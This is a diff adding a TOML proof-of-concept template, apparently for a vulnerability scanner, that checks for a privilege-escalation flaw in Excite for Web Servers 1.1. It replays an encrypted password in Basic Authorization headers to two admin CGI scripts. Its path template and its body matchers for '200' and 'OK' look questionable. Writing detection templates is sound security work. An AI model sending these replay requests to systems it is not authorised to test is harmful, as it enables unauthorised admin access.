@@ -1,0 +1,50 @@
+[info]
+author = "ave"
+description = "Excite for Web Servers (EWS) 1.1 将加密密码明文存储在全局可读的 Architext.conf 中，攻击者可读取该文件获取加密密码，通过 HTTP 请求重放至 AT-generated.cgi 或 AT-admin.cgi 实现权限提升。本 PoC 模拟重放加密密码请求验证漏洞存在。"
+id = "POC-AVE-1999-1320"
+name = "Excite for Web Servers 1.1 权限提升漏洞 PoC"
+severity = "high"
+tags = ["ave-1999-1320"]
+vuln_id = [
+    "CVE-1999-1072",
+    "AVE-1999-1320",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/AT-generated.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{encrypted_password}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OK",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/AT-admin.cgi"
+protocol = "http"
+
+[poc.requests.headers]
+Authorization = "Basic {{encrypted_password}}"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "200",
+    "OK",
+]
